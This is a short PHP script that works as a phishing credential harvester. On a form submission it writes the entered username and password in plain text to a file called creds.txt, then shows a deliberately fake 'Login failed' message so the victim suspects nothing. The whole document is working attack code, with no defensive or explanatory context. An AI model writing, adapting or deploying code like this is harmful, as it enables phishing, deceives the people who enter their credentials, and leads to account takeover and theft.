<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';

    file_put_contents(__DIR__ . "/creds.txt", "$user : $pass\n", FILE_APPEND);

    // Show a fake "login failed" message or redirect
    echo "<h2>Login failed. Please try again.</h2>";
}
?>

